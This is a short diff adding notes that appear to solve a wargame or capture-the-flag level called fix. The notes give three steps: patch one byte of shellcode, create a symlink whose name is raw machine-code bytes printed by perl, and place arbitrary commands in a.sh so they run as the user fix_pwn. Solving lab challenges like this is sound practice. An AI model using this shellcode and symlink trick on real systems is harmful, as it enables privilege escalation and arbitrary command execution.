@@ -1,0 +1,4 @@
+1. change 15th index of shellcode into 0xc9 (201)
+2. create symlink for a shell script input file:
+ln -s /tmp/fix8/a.sh `perl -e 'print"\x83\xc4\x10\x83\xec\x0c\x50\xe8\x4d\x61\x01"'`
+3. put whatever commands in a.sh. these commands will be executed as fix_pwn
